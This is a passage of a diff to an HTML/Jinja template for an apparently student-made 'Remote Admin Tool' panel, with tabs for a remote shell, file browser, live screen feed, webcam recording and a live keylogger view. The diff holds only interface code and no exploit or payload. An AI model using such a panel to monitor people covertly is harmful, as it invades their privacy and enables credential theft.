@@ -2,334 +2,381 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Server Control Center - iOS Style</title>
+    <title>Ultimate Server Control</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     
     <style>
-        /* --- GIỮ NGUYÊN CSS CŨ --- */
-        :root { --bg-color: #000000; --bg-gradient: linear-gradient(135deg, #1c1c1e 0%, #000000 100%); --glass-bg: rgba(30, 30, 30, 0.7); --glass-border: 1px solid rgba(255, 255, 255, 0.12); --glass-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5); --text-main: #f5f5f7; --text-muted: #86868b; --accent: #0a84ff; --danger: #ff453a; --success: #30d158; --warning: #ffd60a; --sidebar-bg: rgba(28, 28, 30, 0.8); }
-        [data-theme="light"] { --bg-color: #f2f2f7; --bg-gradient: linear-gradient(135deg, #f2f2f7 0%, #e5e5ea 100%); --glass-bg: rgba(255, 255, 255, 0.75); --glass-border: 1px solid rgba(255, 255, 255, 0.4); --glass-shadow: 0 4px 24px rgba(0, 0, 0, 0.06); --text-main: #1d1d1f; --text-muted: #6e6e73; --accent: #007aff; --danger: #ff3b30; --success: #34c759; --warning: #ffcc00; --sidebar-bg: rgba(255, 255, 255, 0.8); }
-        * { box-sizing: border-box; margin: 0; padding: 0; transition: background-color 0.3s ease, color 0.3s ease; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg-gradient); color: var(--text-main); height: 100vh; display: flex; overflow: hidden; }
-        .sidebar { width: 90px; background: var(--sidebar-bg); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-right: var(--glass-border); display: flex; flex-direction: column; align-items: center; padding: 30px 0; z-index: 100; }
-        .nav-item { width: 50px; height: 50px; display: flex; justify-content: center; align-items: center; margin-bottom: 25px; border-radius: 14px; color: var(--text-muted); font-size: 1.4rem; cursor: pointer; text-decoration: none; position: relative; transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        /* THEME & VARS */
+        :root { --bg: #000; --glass: rgba(30,30,30,0.6); --border: 1px solid rgba(255,255,255,0.1); --accent: #0a84ff; --danger: #ff3b30; --success: #30d158; --text: #fff; --text-dim: #888; }
+        [data-theme="light"] { --bg: #f2f2f7; --glass: rgba(255,255,255,0.8); --border: 1px solid #ccc; --accent: #007aff; --text: #000; --text-dim: #666; }
+        
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: linear-gradient(135deg, var(--bg), #1c1c1e); color: var(--text); height: 100vh; display: flex; overflow: hidden; }
+        
+        /* SIDEBAR */
+        .sidebar { width: 80px; background: var(--glass); backdrop-filter: blur(20px); border-right: var(--border); display: flex; flex-direction: column; align-items: center; padding: 20px 0; z-index: 10; }
+        .nav-item { width: 50px; height: 50px; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; border-radius: 14px; color: var(--text-dim); font-size: 1.4rem; cursor: pointer; transition: 0.3s; text-decoration: none; }
         .nav-item:hover, .nav-item.active { background: var(--accent); color: white; transform: scale(1.1); box-shadow: 0 4px 15px var(--accent); }
-        .sidebar-bottom { margin-top: auto; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .main-content { flex: 1; padding: 40px; overflow-y: auto; position: relative; }
-        .page-header { margin-bottom: 40px; display: flex; justify-content: space-between; align-items: center; }
-        .page-title { font-size: 2.5rem; font-weight: 700; letter-spacing: -0.5px; background: linear-gradient(90deg, var(--text-main), var(--text-muted)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
-        .server-status { padding: 8px 16px; border-radius: 20px; background: var(--glass-bg); backdrop-filter: blur(10px); border: var(--glass-border); color: var(--success); font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; box-shadow: var(--glass-shadow); cursor: pointer; transition: 0.2s;}
-        .server-status:hover { transform: scale(1.05); }
-        .status-dot { width: 10px; height: 10px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        .glass-card { background: var(--glass-bg); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: var(--glass-border); border-radius: 24px; padding: 30px; box-shadow: var(--glass-shadow); margin-bottom: 30px; transition: transform 0.3s ease; }
-        .glass-card:hover { transform: translateY(-5px); }
-        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 30px; }
-        .btn { padding: 12px 24px; border: none; border-radius: 12px; cursor: pointer; font-weight: 600; font-size: 0.95rem; display: inline-flex; align-items: center; gap: 10px; color: white; text-decoration: none; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); position: relative; overflow: hidden; }
-        .btn:hover { transform: scale(1.05); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
-        .btn:active { transform: scale(0.95); }
-        .btn-primary { background: var(--accent); } .btn-success { background: var(--success); } .btn-danger { background: var(--danger); } .btn-warning { background: var(--warning); color: #000; } .btn-sm { padding: 8px 16px; font-size: 0.85rem; border-radius: 10px; }
-        .theme-toggle { background: transparent; border: 2px solid var(--text-muted); color: var(--text-muted); width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; }
-        .theme-toggle:hover { border-color: var(--accent); color: var(--accent); transform: rotate(180deg); }
-        .glass-table { width: 100%; border-collapse: separate; border-spacing: 0 10px; }
-        .glass-table th { text-align: left; padding: 15px; color: var(--text-muted); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; }
-        .glass-table tr { background: rgba(255,255,255,0.03); transition: 0.2s; }
-        .glass-table tr td:first-child { border-top-left-radius: 12px; border-bottom-left-radius: 12px; }
-        .glass-table tr td:last-child { border-top-right-radius: 12px; border-bottom-right-radius: 12px; }
-        .glass-table td { padding: 15px; vertical-align: middle; }
-        .glass-table tr:hover { background: rgba(255,255,255,0.08); transform: scale(1.01); }
-        .webcam-container { width: 100%; max-width: 900px; margin: 0 auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.3); background: #000; position: relative; }
-        .webcam-container img { width: 100%; display: block; }
-        .rec-indicator { position: absolute; top: 20px; right: 20px; background: rgba(255, 59, 48, 0.9); color: white; padding: 6px 14px; border-radius: 20px; font-size: 0.8rem; font-weight: bold; display: none; align-items: center; gap: 6px; backdrop-filter: blur(10px); box-shadow: 0 4px 10px rgba(255,59,48,0.4); }
-        .terminal-window { background: #1c1c1e; border-radius: 16px; padding: 20px; font-family: 'Menlo', 'Monaco', monospace; color: var(--success); height: 350px; overflow-y: auto; border: 1px solid rgba(255,255,255,0.1); box-shadow: inset 0 0 30px rgba(0,0,0,0.5); }
-        #toast { position: fixed; top: 30px; left: 50%; transform: translateX(-50%) translateY(-100px); background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); color: #000; padding: 12px 30px; border-radius: 50px; display: flex; align-items: center; gap: 10px; font-weight: 500; box-shadow: 0 10px 40px rgba(0,0,0,0.2); transition: 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55); z-index: 1000; }
-        #toast.success i { color: var(--success); } #toast.error i { color: var(--danger); }
-        [data-theme="dark"] #toast { background: rgba(30, 30, 30, 0.9); color: #fff; }
-        ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { background: transparent; } ::-webkit-scrollbar-thumb { background: var(--text-muted); border-radius: 10px; }
+        .bottom-nav { margin-top: auto; display: flex; flex-direction: column; gap: 10px; }
 
-        /* --- MODAL SETTINGS --- */
-        .modal {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); z-index: 200;
-            justify-content: center; align-items: center;
-        }
-        .modal-content {
-            background: var(--glass-bg); width: 400px; padding: 30px;
-            border-radius: 24px; border: var(--glass-border);
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            text-align: center;
-        }
-        .modal input {
-            width: 100%; padding: 12px; margin: 10px 0;
-            border-radius: 12px; border: 1px solid var(--text-muted);
-            background: rgba(255,255,255,0.1); color: var(--text-main);
-            font-size: 1rem;
-        }
+        /* MAIN */
+        .main { flex: 1; padding: 30px; overflow-y: auto; position: relative; }
+        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .title { font-size: 2rem; font-weight: 700; }
+        .status { padding: 6px 12px; border-radius: 20px; background: rgba(46, 204, 113, 0.2); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.3); font-weight: 600; font-size: 0.9rem; cursor: pointer;}
+
+        /* CARDS */
+        .card { background: var(--glass); border: var(--border); border-radius: 24px; padding: 25px; margin-bottom: 25px; backdrop-filter: blur(20px); box-shadow: 0 8px 32px rgba(0,0,0,0.3); }
+        
+        /* UTILS */
+        .btn { padding: 8px 16px; border-radius: 8px; border: none; cursor: pointer; font-weight: 600; color: white; background: var(--accent); display: inline-flex; align-items: center; gap: 8px; }
+        .btn:hover { filter: brightness(1.1); transform: translateY(-2px); transition: 0.2s; }
+        .btn-danger { background: var(--danger); }
+        .btn-success { background: var(--success); }
+        .hidden { display: none; }
+
+        /* FEATURE SPECIFIC STYLES */
+        .file-path { padding: 10px; background: rgba(255,255,255,0.1); border-radius: 8px; margin-bottom: 15px; font-family: monospace; display: flex; align-items: center; gap: 10px; }
+        .file-table { width: 100%; border-collapse: collapse; }
+        .file-table td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        .file-item { cursor: pointer; transition: 0.2s; }
+        .file-item:hover { background: rgba(255,255,255,0.05); }
+        .file-icon { width: 24px; text-align: center; color: var(--accent); margin-right: 10px; }
+
+        .terminal { background: #1e1e1e; border-radius: 12px; padding: 15px; font-family: 'Consolas', monospace; color: #0f0; height: 400px; display: flex; flex-direction: column; border: 1px solid #333; }
+        .term-out { flex: 1; overflow-y: auto; white-space: pre-wrap; font-size: 0.9rem; padding-bottom: 10px; }
+        .term-in { background: transparent; border: none; color: #fff; font-family: inherit; font-size: 1rem; outline: none; width: 100%; border-top: 1px solid #333; padding-top: 10px; }
+
+        .skeleton { width: 100%; height: 20px; background: linear-gradient(90deg, rgba(255,255,255,0.05) 25%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0.05) 75%); background-size: 200% 100%; animation: loading 1.5s infinite; border-radius: 4px; margin: 10px 0; }
+        @keyframes loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
+
+        .chart-container { height: 250px; width: 100%; }
+        
+        /* WEBCAM & SCREEN Styles */
+        .video-box { width: 100%; max-width: 900px; margin: 0 auto; background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 2px solid #333; aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center; }
+        .video-box img { width: 100%; height: auto; display: block; }
+        .rec-tag { position: absolute; top: 15px; right: 15px; background: rgba(255,0,0,0.8); color: white; padding: 5px 10px; border-radius: 20px; font-size: 0.8rem; display: none; align-items: center; gap: 5px; }
+        .blink { width: 8px; height: 8px; background: #fff; border-radius: 50%; animation: blink 1s infinite; } @keyframes blink { 50% { opacity: 0; } }
+
+        .keylog-window { background: #111; color: var(--success); padding: 15px; border-radius: 12px; height: 300px; overflow-y: auto; font-family: monospace; border: 1px solid #333; white-space: pre-wrap; }
+
+        /* TOAST */
+        #toast { position: fixed; top: 30px; left: 50%; transform: translate(-50%, -100px); background: rgba(255,255,255,0.9); color: black; padding: 10px 20px; border-radius: 50px; transition: 0.5s; z-index: 100; font-weight: 600; }
     </style>
 </head>
 <body>
 
     <div class="sidebar">
-        <a href="/" class="nav-item {{ 'active' if not mode or mode == 'home' }}" title="Dashboard"><i class="fa-solid fa-house"></i></a>
-        <a href="/apps" class="nav-item {{ 'active' if mode == 'apps' }}" title="Apps"><i class="fa-brands fa-app-store-ios"></i></a>
-        <a href="/processes" class="nav-item {{ 'active' if mode == 'processes' }}" title="Processes"><i class="fa-solid fa-microchip"></i></a>
-        <a href="/webcam" class="nav-item {{ 'active' if mode == 'webcam' }}" title="Camera"><i class="fa-solid fa-video"></i></a>
-        <a href="/screenshot" class="nav-item {{ 'active' if mode == 'screenshot' }}" title="Screen"><i class="fa-solid fa-desktop"></i></a>
-        <a href="/keylogger" class="nav-item {{ 'active' if mode == 'keylogger' }}" title="Keylog"><i class="fa-solid fa-keyboard"></i></a>
-
-        <div class="sidebar-bottom">
-            <div class="nav-item" onclick="openSettings()" title="Cài đặt IP/Port" style="color: var(--accent);">
-                <i class="fa-solid fa-wifi"></i>
-            </div>
-
-            <div class="nav-item theme-toggle" onclick="toggleTheme()" title="Đổi giao diện">
-                <i class="fa-solid fa-moon"></i>
-            </div>
-            
-            <div style="border-top: 1px solid rgba(255,255,255,0.1); width: 60%; margin: 10px 0;"></div>
-
-            <a href="/restart" class="nav-item {{ 'active' if mode == 'restart' }}" title="Restart PC" style="color: var(--warning);">
-                <i class="fa-solid fa-rotate-right"></i>
-            </a>
-            <a href="/shutdown" class="nav-item {{ 'active' if mode == 'shutdown' }}" title="Shutdown PC" style="color: var(--danger);">
-                <i class="fa-solid fa-power-off"></i>
-            </a>
-        </div>
-    </div>
-
-    <div class="main-content">
+        <a href="#home" class="nav-item active" onclick="showTab('home')" title="Dashboard"><i class="fa-solid fa-gauge"></i></a>
+        <a href="#apps" class="nav-item" onclick="showTab('apps')" title="Apps"><i class="fa-brands fa-app-store-ios"></i></a>
+        <a href="#processes" class="nav-item" onclick="showTab('processes')" title="Processes"><i class="fa-solid fa-microchip"></i></a>
+        <a href="#files" class="nav-item" onclick="showTab('files')" title="Files"><i class="fa-solid fa-folder"></i></a>
+        <a href="#terminal" class="nav-item" onclick="showTab('terminal')" title="Terminal"><i class="fa-solid fa-terminal"></i></a>
         
-        <div class="page-header">
-            <h1 class="page-title">
-                {% if mode == 'apps' %}Applications{% elif mode == 'processes' %}Task Manager{% elif mode == 'webcam' %}Live Cam{% elif mode == 'keylogger' %}Keylogger{% else %}Control Center{% endif %}
-            </h1>
-            <div class="server-status" onclick="openSettings()" title="Bấm để đổi IP">
-                <div class="status-dot"></div> <span id="status-text">Connected</span>
-            </div>
+        <a href="#screen" class="nav-item" onclick="showTab('screen')" title="Screen Monitor"><i class="fa-solid fa-desktop"></i></a>
+        
+        <a href="#webcam" class="nav-item" onclick="showTab('webcam')" title="Webcam"><i class="fa-solid fa-video"></i></a>
+        <a href="#keylogger" class="nav-item" onclick="showTab('keylogger')" title="Keylogger"><i class="fa-solid fa-keyboard"></i></a>
+        <a href="#power" class="nav-item" onclick="showTab('power')" title="Power" style="color: var(--danger)"><i class="fa-solid fa-power-off"></i></a>
+        
+        <div class="bottom-nav">
+            <div class="nav-item" onclick="toggleTheme()" title="Theme"><i class="fa-solid fa-moon"></i></div>
+            <div class="nav-item" onclick="openSettings()" style="color:var(--accent)" title="Settings"><i class="fa-solid fa-wifi"></i></div>
+        </div>
+    </div>
+
+    <div class="main">
+        <div class="header">
+            <div class="title" id="page-title">DASHBOARD</div>
+            <div class="status" onclick="openSettings()"><div style="width:8px;height:8px;background:#2ecc71;border-radius:50%;display:inline-block;margin-right:5px;"></div> <span id="ip-display">Connected</span></div>
         </div>
 
-        {% if not mode or mode == 'home' %}
-        <div class="dashboard-grid">
-            <div class="glass-card" style="grid-column: 1 / -1; text-align: center; padding: 50px;">
-                <div style="font-size: 5rem; color: var(--accent); margin-bottom: 20px; filter: drop-shadow(0 0 20px var(--accent));">
-                    <i class="fa-brands fa-apple"></i>
-                </div>
-                <h2 style="font-size: 2.5rem; margin-bottom: 10px;">Remote Admin Tool</h2>
-                <p style="color: var(--text-muted); font-size: 1.1rem;">Designed by Tran Trung Hieu - 24TNT1</p>
-                <div style="margin-top: 40px; display: flex; justify-content: center; gap: 20px;">
-                    <a href="/webcam" class="btn btn-primary"><i class="fa-solid fa-eye"></i> Open Camera</a>
-                    <a href="/keylogger" class="btn btn-warning"><i class="fa-solid fa-terminal"></i> View Logs</a>
+        <div id="tab-home" class="tab-content">
+            <div class="card">
+                <h3><i class="fa-solid fa-chart-line"></i> Real-time Resources</h3>
+                <div class="chart-container">
+                    <canvas id="sysChart"></canvas>
                 </div>
             </div>
-            
-            <div class="glass-card">
-                <h3 style="color: var(--text-muted); font-size: 0.9rem; letter-spacing: 1px; margin-bottom: 15px;">CONNECTION</h3>
-                <div style="font-size: 2rem; font-weight: 800; color: var(--success);" id="display-ip">...</div>
-                <div style="margin-top: 10px; font-size: 0.9rem; color: var(--text-muted);">
-                    <i class="fa-solid fa-shield-halved"></i> Secured Protocol<br>
-                    <i class="fa-solid fa-bolt"></i> Low Latency
-                </div>
-            </div>
-            
-            <div class="glass-card">
-                <h3 style="color: var(--text-muted); font-size: 0.9rem; letter-spacing: 1px; margin-bottom: 15px;">QUICK ACCESS</h3>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
-                    <button onclick="sendControl('screenshot')" class="btn btn-sm btn-primary" style="justify-content: center;"><i class="fa-solid fa-camera"></i> Snap</button>
-                    <button onclick="if(confirm('Restart?')) window.location='/restart'" class="btn btn-sm btn-warning" style="justify-content: center;"><i class="fa-solid fa-rotate"></i> Reboot</button>
+            <div class="card">
+                <h3>Quick Shortcuts</h3>
+                <div style="display:flex; gap:10px; margin-top:15px;">
+                    <button onclick="showTab('screen')" class="btn"><i class="fa-solid fa-desktop"></i> Monitor Screen</button>
+                    <button onclick="showTab('webcam')" class="btn" style="background:#8e44ad"><i class="fa-solid fa-video"></i> View Cam</button>
+                    <button onclick="showTab('terminal')" class="btn" style="background:#34495e"><i class="fa-solid fa-terminal"></i> Terminal</button>
                 </div>
             </div>
         </div>
-        {% endif %}
 
-        {% if mode == "apps" %}
-        <div class="glass-card">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h3><i class="fa-brands fa-app-store-ios"></i> Installed Applications</h3>
-                <button onclick="location.reload()" class="btn btn-sm btn-primary"><i class="fa-solid fa-rotate"></i> Refresh</button>
-            </div>
-            <table class="glass-table">
-                <thead><tr><th>Application Name</th><th>Status</th><th style="text-align: right;">Controls</th></tr></thead>
-                <tbody>
-                    {% if app_list %}
-                        {% for key, info in app_list.items() %}
-                        <tr>
-                            <td style="font-weight: 500;">{{ info.name }}</td>
-                            <td>
-                                <span style="padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: 600; background: {{ 'rgba(52,199,89,0.15)' if info.running else 'rgba(142,142,147,0.15)' }}; color: {{ 'var(--success)' if info.running else 'var(--text-muted)' }}">
-                                    {{ '● Running' if info.running else '○ Stopped' }}
-                                </span>
-                            </td>
-                            <td style="text-align: right;">
-                                <button onclick="sendControl('start', '{{key}}')" class="btn btn-sm {{ 'btn-success' if not info.running else '' }}" {{ 'disabled' if info.running else '' }}><i class="fa-solid fa-play"></i></button>
-                                <button onclick="sendControl('stop', '{{key}}')" class="btn btn-sm {{ 'btn-danger' if info.running else '' }}" {{ 'disabled' if not info.running else '' }}><i class="fa-solid fa-stop"></i></button>
-                            </td>
-                        </tr>
-                        {% endfor %}
-                    {% endif %}
-                </tbody>
-            </table>
-        </div>
-        {% endif %}
-
-        {% if mode == "processes" %}
-        <div class="glass-card">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h3><i class="fa-solid fa-microchip"></i> Top Resource Consumers</h3>
-                <form action="/processes" method="GET"><button class="btn btn-sm btn-primary"><i class="fa-solid fa-rotate"></i> Update</button></form>
-            </div>
-            <table class="glass-table">
-                <thead><tr><th>PID</th><th>Process Name</th><th>CPU Usage</th><th style="text-align: right;">Action</th></tr></thead>
-                <tbody>
-                    {% if process_list %}
-                        {% for line in process_list.strip().split('\n')[1:] %}
-                            {% set parts = line.split() %}
-                            {% if parts|length >= 3 %}
-                            <tr>
-                                <td style="font-family: monospace; color: var(--accent);">{{parts[0]}}</td>
-                                <td>{{parts[2:]|join(' ')}}</td>
-                                <td style="color: var(--danger); font-weight: bold;">{{parts[1]}}%</td>
-                                <td style="text-align: right;">
-                                    <button onclick="killProcess('{{parts[0]}}')" class="btn btn-sm btn-danger"><i class="fa-solid fa-xmark"></i> Force Quit</button>
-                                </td>
-                            </tr>
-                            {% endif %}
-                        {% endfor %}
-                    {% endif %}
-                </tbody>
-            </table>
-        </div>
-        {% endif %}
-
-        {% if mode == "webcam" %}
-        <div class="glass-card" style="text-align: center;">
-            <div class="webcam-container">
-                <div id="rec-indicator" class="rec-indicator"><div class="rec-dot"></div> REC</div>
-                <img src="/video_feed_webcam" onerror="this.parentElement.innerHTML='<div style=\'padding:100px; color:var(--text-muted)\'><i class=\'fa-solid fa-video-slash\' style=\'font-size:3rem; margin-bottom:20px;\'></i><br>Camera Unavailable</div>'">
-            </div>
-            <div style="margin-top: 30px; display: flex; justify-content: center; gap: 15px;">
-                <select id="cam-seconds" style="background: var(--glass-bg); border: var(--glass-border); color: var(--text-main); padding: 12px; border-radius: 12px; outline: none;">
-                    <option value="5">Record 5s</option>
-                    <option value="10">Record 10s</option>
-                    <option value="30">Record 30s</option>
-                </select>
-                <button onclick="recordWebcam()" class="btn btn-danger"><i class="fa-solid fa-circle"></i> Start Recording</button>
-            </div>
-        </div>
-        {% endif %}
-
-        {% if mode == "screenshot" %}
-        <div class="glass-card" style="text-align: center;">
-            <div class="webcam-container" style="border-color: var(--accent); aspect-ratio: 16/9; display: flex; align-items: center; justify-content: center; background: #1c1c1e;">
-                <img src="/video_feed_screen" style="width: 100%;">
-            </div>
-            <div style="margin-top: 30px;">
-                <button onclick="sendControl('screenshot')" class="btn btn-primary"><i class="fa-solid fa-camera"></i> Capture & Download</button>
-            </div>
-        </div>
-        {% endif %}
-
-        {% if mode == "keylogger" %}
-        <div class="glass-card">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h3><i class="fa-solid fa-keyboard"></i> Live Keylogs</h3>
-                <div id="keylog-status" style="font-size: 0.9rem; font-weight: 600; padding: 5px 15px; background: rgba(255,255,255,0.1); border-radius: 20px;">READY</div>
-            </div>
-            
-            <div class="terminal-window" id="keylog">
-                <span style="color: var(--text-muted);">// System ready. Waiting for input...</span>
-            </div>
-
-            <div style="margin-top: 25px; display: flex; gap: 15px;">
-                <button onclick="updateKeylogStatus('recording')" class="btn btn-success"><i class="fa-solid fa-play"></i> Start</button>
-                <button onclick="updateKeylogStatus('stopped')" class="btn btn-warning"><i class="fa-solid fa-pause"></i> Pause</button>
-                <button onclick="sendControl('keylog_clear')" class="btn btn-danger" style="margin-left: auto;"><i class="fa-solid fa-trash"></i> Clear</button>
-            </div>
-        </div>
-        <script>
-            function updateKeylogStatus(state) {
-                const statusEl = document.getElementById('keylog-status');
-                if (state === 'recording') {
-                    sendControl('keylog_start');
-                    statusEl.textContent = "RECORDING...";
-                    statusEl.style.color = "var(--danger)";
-                    statusEl.style.background = "rgba(255, 59, 48, 0.1)";
-                } else {
-                    sendControl('keylog_stop');
-                    statusEl.textContent = "PAUSED";
-                    statusEl.style.color = "var(--warning)";
-                    statusEl.style.background = "rgba(255, 204, 0, 0.1)";
-                }
-            }
-            setInterval(()=>{
-                fetch("/keylogger_data").then(r=>r.json()).then(d=>{
-                    const p=document.getElementById("keylog");
-                    if(d.keys && d.keys !== p.textContent) { 
-                        p.textContent = d.keys; 
-                        p.scrollTop = p.scrollHeight; 
-                    }
-                })
-            }, 1000); 
-        </script>
-        {% endif %}
-
-        {% if mode == "shutdown" or mode == "restart" %}
-        <div style="display: flex; justify-content: center; align-items: center; height: 70%;">
-            <div class="glass-card" style="text-align: center; border: 2px solid {{ 'var(--danger)' if mode=='shutdown' else 'var(--warning)' }}; padding: 60px;">
-                <div style="font-size: 5rem; margin-bottom: 30px; color: {{ 'var(--danger)' if mode=='shutdown' else 'var(--warning)' }};">
-                    <i class="fa-solid {{ 'fa-power-off' if mode=='shutdown' else 'fa-rotate' }}"></i>
+        <div id="tab-files" class="tab-content hidden">
+            <div class="card">
+                <div class="file-path">
+                    <button onclick="loadFiles('..')" class="btn" style="padding: 4px 10px; font-size: 0.8rem;"><i class="fa-solid fa-arrow-up"></i> Up</button>
+                    <span id="current-path">/Loading...</span>
                 </div>
-                <h2 style="font-size: 2rem; margin-bottom: 10px;">{{ 'System Shutdown' if mode=='shutdown' else 'System Reboot' }}</h2>
-                <p style="color: var(--text-muted); margin-bottom: 40px;">Are you sure? This action cannot be undone.</p>
-                <button onclick="sendControl('{{mode}}')" class="btn {{ 'btn-danger' if mode=='shutdown' else 'btn-warning' }}">
-                    {{ 'Confirm Shutdown' if mode=='shutdown' else 'Confirm Restart' }}
-                </button>
+                <div style="overflow-x:auto;">
+                    <table class="file-table">
+                        <thead><tr><th>Name</th><th>Size</th><th>Action</th></tr></thead>
+                        <tbody id="file-list"></tbody>
+                    </table>
+                </div>
             </div>
         </div>
-        {% endif %}
+
+        <div id="tab-terminal" class="tab-content hidden">
+            <div class="card" style="padding:0; overflow:hidden;">
+                <div class="terminal">
+                    <div class="term-out" id="term-out">Welcome to Remote Shell.<br>Type a command and press Enter...<br></div>
+                    <input type="text" class="term-in" id="term-in" placeholder=">_" autocomplete="off">
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-processes" class="tab-content hidden">
+            <div class="card">
+                <div style="display:flex; justify-content:space-between;">
+                    <h3>Top Processes</h3>
+                    <button onclick="loadProcesses()" class="btn"><i class="fa-solid fa-rotate"></i> Refresh</button>
+                </div>
+                <table class="file-table" style="margin-top:15px;">
+                    <thead><tr><th>PID</th><th>Name</th><th>CPU %</th><th>Mem %</th><th>Action</th></tr></thead>
+                    <tbody id="proc-list"></tbody>
+                </table>
+            </div>
+        </div>
+        
+        <div id="tab-apps" class="tab-content hidden">
+             <div class="card">
+                 <div style="display:flex; justify-content:space-between;">
+                    <h3>Installed Applications</h3>
+                    <button onclick="loadApps()" class="btn"><i class="fa-solid fa-rotate"></i> Refresh</button>
+                 </div>
+                 <div id="app-list" style="margin-top:15px;"></div>
+             </div>
+        </div>
+
+        <div id="tab-screen" class="tab-content hidden">
+            <div class="card" style="text-align: center;">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                    <h3>Live Screen Monitor</h3>
+                    <button onclick="sendControl('screenshot')" class="btn"><i class="fa-solid fa-camera"></i> Capture & Save</button>
+                </div>
+                <div class="video-box">
+                    <img src="/video_feed_screen" onerror="this.style.display='none'; this.parentElement.innerHTML+='<div style=\'padding:50px; color:#aaa\'>Screen Offline</div>'">
+                </div>
+                <p style="margin-top:10px; color:#888; font-size:0.9rem;">Real-time feed from remote desktop.</p>
+            </div>
+        </div>
+
+        <div id="tab-webcam" class="tab-content hidden">
+            <div class="card" style="text-align: center;">
+                <div class="video-box">
+                    <div id="rec-indicator" class="rec-tag"><div class="blink"></div> REC</div>
+                    <img src="/video_feed_webcam" onerror="this.style.display='none'; this.parentElement.innerHTML+='<div style=\'padding:50px; color:#aaa\'>Camera Offline</div>'">
+                </div>
+                <div style="margin-top: 20px; display: flex; justify-content: center; gap: 15px;">
+                    <select id="cam-seconds" style="background: rgba(255,255,255,0.1); border: 1px solid #555; color: var(--text); padding: 8px; border-radius: 8px;">
+                        <option value="5">5 Seconds</option>
+                        <option value="10">10 Seconds</option>
+                        <option value="30">30 Seconds</option>
+                    </select>
+                    <button onclick="recordWebcam()" class="btn btn-danger"><i class="fa-solid fa-circle"></i> Record</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-keylogger" class="tab-content hidden">
+            <div class="card">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
+                    <h3>Live Keylogs</h3>
+                    <div id="kl-status" style="font-size: 0.9rem; color: #888;">Ready</div>
+                </div>
+                <div class="keylog-window" id="keylog-content">Waiting for input...</div>
+                <div style="margin-top: 20px; display: flex; gap: 10px;">
+                    <button onclick="toggleKeylog(true)" class="btn btn-success"><i class="fa-solid fa-play"></i> Start</button>
+                    <button onclick="toggleKeylog(false)" class="btn" style="background:#f39c12"><i class="fa-solid fa-pause"></i> Stop</button>
+                    <button onclick="sendControl('keylog_clear')" class="btn btn-danger" style="margin-left: auto;"><i class="fa-solid fa-trash"></i> Clear</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-power" class="tab-content hidden">
+            <div style="display: flex; justify-content: center; align-items: center; height: 60vh;">
+                <div class="card" style="text-align: center; padding: 50px; border: 2px solid var(--danger);">
+                    <i class="fa-solid fa-power-off" style="font-size: 4rem; color: var(--danger); margin-bottom: 20px;"></i>
+                    <h2>System Power Control</h2>
+                    <p style="color: #888; margin-bottom: 30px;">Be careful! These actions affect the physical machine.</p>
+                    <div style="display: flex; gap: 20px; justify-content: center;">
+                        <button onclick="if(confirm('Reboot Server?')) sendControl('restart')" class="btn" style="background:#f39c12; padding: 12px 24px;">Restart</button>
+                        <button onclick="if(confirm('Shutdown Server?')) sendControl('shutdown')" class="btn btn-danger" style="padding: 12px 24px;">Shutdown</button>
+                    </div>
+                </div>
+            </div>
+        </div>
 
     </div>
 
-    <div id="settingsModal" class="modal">
-        <div class="modal-content">
-            <h2 style="margin-bottom: 20px;">Connection Settings</h2>
-            <input type="text" id="input-ip" placeholder="Server IP (e.g. 192.168.1.5)">
-            <input type="number" id="input-port" placeholder="Port (e.g. 5001)">
-            <div style="margin-top: 20px; display: flex; gap: 10px; justify-content: center;">
-                <button onclick="saveSettings()" class="btn btn-primary">Connect</button>
